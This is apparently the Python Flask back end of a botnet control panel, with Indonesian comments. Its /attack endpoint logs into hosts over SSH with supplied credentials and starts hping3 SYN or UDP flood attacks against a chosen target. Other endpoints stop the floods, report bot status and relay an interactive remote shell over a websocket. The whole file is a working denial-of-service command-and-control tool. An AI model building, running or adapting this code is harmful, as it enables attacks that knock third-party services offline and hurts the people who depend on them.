from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
from flask_sock import Sock
from urllib.parse import parse_qs
import paramiko
import threading

app = Flask(__name__)
sock = Sock(app)
CORS(app)

@app.route('/')
def mainpage():
    return render_template('index.html')

# refresh keadaaan botnet
@app.route('/attack', methods=['POST'])
def attack():
    data = request.get_json()

    ip = data.get('ip')
    port = int(data.get('port', 22))  # default port 22 jika tidak ada
    username = data.get('username')
    password = data.get('password')
    targetip = data.get('target')
    option = int(data.get('option'))
    print(ip, port, username, password, targetip, option)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        if option == 1:
            stdin, stdout, stderr = ssh.exec_command(f"hping3 -S -p 80 --flood {targetip} > /dev/null 2>&1 &")
        elif option == 2:
            stdin, stdout, stderr = ssh.exec_command(f"hping3 --udp -p 80 --flood {targetip} > /dev/null 2>&1 &")
        elif option == 3: 
            stdin, stdout, stderr = ssh.exec_command("killall hping3; killall python")
        
        ssh.close()
        
        if stderr.read().decode():
            return jsonify({'success': 0, 'message': f'Error {stderr.read().decode()}'})
        else:
            return jsonify({'success': 1, 'message': 'Successfully executed the command'})
    except Exception as e:
        return jsonify({'success': 0, 'message': 'Error while trying to execute'})
        
                
@app.route('/kill', methods=['POST'])
def kilbotnet():
    data = request.get_json()

    ip = data.get('ip')
    port = int(data.get('port', 22))  # default port 22 jika tidak ada
    username = data.get('username')
    password = data.get('password')
    status = data.get('status')

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command("killall hping3; killall python")
        ssh.close()
        if stderr.read().decode():
            return jsonify({'success': 0, 'message': f'{stdout.read().decode()}'})
        else:
            return jsonify({'success': 1, 'message': 'Successfully kill the botnet.'})
    except Exception as e:
        return jsonify({'success': 0, 'message': 'Error while trying to kill'})

@app.route('/refresh', methods=['POST'])
def refresh():
    data = request.get_json()

    ip = data.get('ip')
    port = int(data.get('port', 22))  # default port 22 jika tidak ada
    username = data.get('username')
    password = data.get('password')
    status = data.get('status')

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command("pgrep hping3; pgrep python")
        pids = stdout.read().decode().strip().split()
        ssh.close()
        if pids:
            print(pids)
            return jsonify({'status': 2, 'message': 'Botnet is running'})
        else:
            return jsonify({'status': 1, 'message': 'Botnet is ready'})
    except Exception as e:
        return jsonify({'status': 0, 'message': 'Botnet disconnected'})

# menjalankan botnet
@app.route('/sshcheck', methods=['POST'])
def check_ssh():
    data = request.get_json()

    ip = data.get('ip')
    port = int(data.get('port', 22))  # default port 22 jika tidak ada
    username = data.get('username')
    password = data.get('password')
    status = data.get('status')

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return jsonify({'success': True, 'message': 'Command execution successfull', 'status': status})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Command execution failed: {str(e)}', 'status': status})

active_sessions = {}

@sock.route('/ws')
def ws_terminal(ws):
    
    query_string = ws.environ.get('QUERY_STRING', '')
    query = parse_qs(query_string)

    ip = query.get('ip', ['127.0.0.1'])[0]
    port = int(query.get('port', ['22'])[0])
    username = query.get('username', [''])[0]
    password = query.get('password', [''])[0]
    
    # Jika koneksi SSH sebelumnya ada, matikan dulu
    if ip in active_sessions:
        print(f"Menutup sesi SSH sebelumnya untuk {ip}")
        session = active_sessions[ip]
        session['event'].set()
        session['chan'].close()
        session['ssh'].close()
        del active_sessions[ip]

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, port=port, username=username, password=password)

    chan = ssh.invoke_shell()
    chan.settimeout(0.0)
    stop_event = threading.Event()

    def read_ssh():
        try:
            while not stop_event.is_set():
                if chan.recv_ready():
                    data = chan.recv(1024).decode('utf-8')
                    ws.send(data)
        except Exception as e:
            print(f"read_ssh error: {e}")

    t = threading.Thread(target=read_ssh, daemon=True)
    t.start()

    # Simpan sesi aktif
    active_sessions[ip] = {
        'ssh': ssh,
        'chan': chan,
        'event': stop_event,
        'thread': t
    }

    try:
        while True:
            data = ws.receive()
            if data is None:
                print("WebSocket closed")
                break
            chan.send(data)
    except Exception as e:
        print(f"WebSocket error: {e}")
    finally:
        # Cleanup ketika websocket tutup
        stop_event.set()
        chan.close()
        ssh.close()
        if ip in active_sessions:
            del active_sessions[ip]
        print("Koneksi SSH ditutup")

if __name__ == '__main__':
    app.run(debug=True)
